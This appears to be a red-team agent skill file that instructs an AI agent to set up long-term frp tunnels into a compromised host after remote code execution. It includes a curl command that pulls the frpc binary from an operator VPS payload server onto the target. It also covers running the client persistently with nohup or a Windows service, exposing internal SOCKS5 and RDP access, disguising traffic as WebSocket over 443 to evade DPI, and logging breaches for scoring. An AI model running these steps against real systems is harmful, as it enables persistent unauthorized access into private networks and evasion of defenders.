---
name: frp-tunnel
description: "frp intranet penetration: run frps on operator VPS and frpc on target host for persistent SOCKS5 proxying and port forwarding"
whenToUse: "When command execution/RCE is obtained and the target has outbound internet connectivity; when long-term stable tunneling or direct port exposure to the operator is required"
role: internal
enabled: true
---

# frp (Intranet Penetration & Long-Term Tunneling)

> **Load VPS Configuration First**: All `$REDTEAM_VPS_HOST` / `$VPS_USER` references in this skill originate from the local configuration,
> initially populated into `$DSH_HOME/.env` by `bash $DSH_HOME/redteam/setup.sh`. Source it prior to each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> If unconfigured, run `setup.sh` once (skill `redteam-setup`), which verifies SSH connectivity and payload hosting services.

`frp` is the **most stable and robust** reverse proxy and tunneling solution: run `frps` (server) on the operator VPS and `frpc` (client) on the target host,
mapping internal SOCKS5 proxies or arbitrary TCP/UDP ports externally. Unlike suo5/chisel, it is **specifically engineered for long-term operational persistence**
(automatic reconnect, multiplexing, native TLS encryption), making it suitable as a persistent pivot into compromised environments.

**Operational Division**: WebShell available -> `suo5-tunnel`; command execution available for rapid ad-hoc pivoting -> `chisel-tunnel`;
**long-term persistence + direct port delivery to operator** -> this skill.

## Local Binaries

| File | Path | Purpose |
| --- | --- | --- |
| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | Server binary for VPS |
| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | Client binary for target |

Synchronized to the VPS payload delivery directory `http://$REDTEAM_VPS_HOST:9100/`. A sample `frps` configuration is also provisioned on the VPS.

## 1. Operator VPS Side: Start frps (Execute First)

```bash
# 1) Upload and configure (Local -> VPS)
scp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \
    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps

# 2) Write configuration (On VPS)
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # frpc connection port
auth.method = "token"
auth.token = "<RANDOM_STRONG_TOKEN>"   # Mandatory: public endpoints require authentication tokens

# Optional: vhostHTTPPort / vhostHTTPSPort for HTTP virtual host tunneling
EOF

# 3) Run inside tmux (must persist across SSH disconnects)
tmux new -s frps
/root/frps -c /root/frps.toml
```

**VPS Security Group Rules**: Ingress open for port `7000` (frpc control port) + any exposed service ports (e.g. `1080`, `13389`).

## 2. Target Side: Run frpc

```bash
# 1) Download binary (via established command execution point)
curl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) Write configuration
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$REDTEAM_VPS_HOST"
serverPort = 7000
auth.method = "token"
auth.token = "<MATCHING_FRPS_TOKEN>"

# 1. Internal SOCKS5 (Full internal subnet access)
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# 2. Specific Port Forwarding (e.g. Internal RDP -> VPS 13389)
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# 3. Optional: HTTP Type (useful when egress is restricted to 80/443 with frps vhostHTTPPort)
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) Run as persistent background process (nohup + automatic reconnect)
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# Windows targets: frpc.exe -c C:\Windows\Temp\frpc.toml (can be registered as a service via sc create for persistence)
```

## 3. Tunnel Consumption from Local Machine

```bash
# SOCKS5 Mode: VPS:1080 serves as the internal network gateway
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# Configuration entry: socks5 $REDTEAM_VPS_HOST 1080
# Do NOT modify /etc/proxychains4.conf; use -f pointing to temporary config under runs/

# Port Forwarding Mode: Connect directly to VPS mapped port
rdesktop $REDTEAM_VPS_HOST:13389
mysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p
```

## 4. Egress Restriction Adaptations

| Restriction | Mitigation |
| --- | --- |
| Outbound traffic restricted to 80/443 | Configure frps with `bindPort = 443` (or port 80 HTTP type), and align client port |
| TLS Deep Packet Inspection (DPI) active | Enable built-in TLS: `transport.tls.enable = true` (default on); switch protocol to `transport.protocol = "kcp"` or `websocket` if needed |
| Target completely isolated from outbound internet | frp is not viable -> pivot to WebShell tunnel (`suo5-tunnel`) |
| Traffic masking required | Set `transport.protocol = "websocket"` + `transport.tls.enable = true` (resembles standard WebSocket over 443) |

## 5. Persistence & Operational Discipline

1. **tmux (server) / nohup (client) Enforcement**: Sessions must not drop when terminal handles close.
2. **Mandatory `auth.token` on Server**: Port 7000 on public IPs is continuously scanned; running without a token exposes the compromised network.
3. **Unique Tokens**: Generate unique tokens per engagement; cleanly terminate services with `pkill frps` / `pkill frpc` upon wrap-up.
4. **On-Host Footprint**: Store binaries and configs in `/tmp` (or `Temp` on Windows) and ensure thorough post-engagement cleanup.
5. Adhere strictly to user-designated engagement boundaries; adapt scope when additional subnets or domains are approved.

## 6. Output & Ledger Registration (Mandatory)

1. **Register Tunnel via `redteam_tunnel_add`** with all required fields:
   - `kind`: `frp`
   - `listen`: The address and port accessible to the operator (e.g. `$REDTEAM_VPS_HOST:1080`)
   - `entry`: Target entry point (e.g. `/tmp/frpc on 10.0.0.6 -> VPS:7000`)
   - `reach`: **Empirically verified reachable internal subnets**
   - `entry_kind`: **`target-outbound`** (target makes outbound connection to operator frps)
     Marking local VPS proxies as `self-only` will be flagged as not constituting a valid perimeter breach.
   - `command`: Full frps and frpc invocations with redacted tokens.
2. **Verify Connectivity**: Run `curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<internal_target>/`. Register as active only after successful verification, then re-check with `redteam_session_check`.
3. **Score Allocation**: `boundary` (tunnel establishes internal reachability; evidence format: "tunnel_addr | reachable_subnet | verified_internal_target").
   Pivoting through the tunnel to compromise additional internal hosts -> `server-host`.
4. **Operator Deliverable**: Supply copy-pasteable connection strings (`socks5://$REDTEAM_VPS_HOST:1080` or forwarded ports) with host and port clearly defined.
5. Record key events in `redteam_chain_add` (`stage_code=boundary-logical`), recording raw command in `tool` and response summary in `result` (e.g. `frpc registered successfully, proxy socks5 start success`).
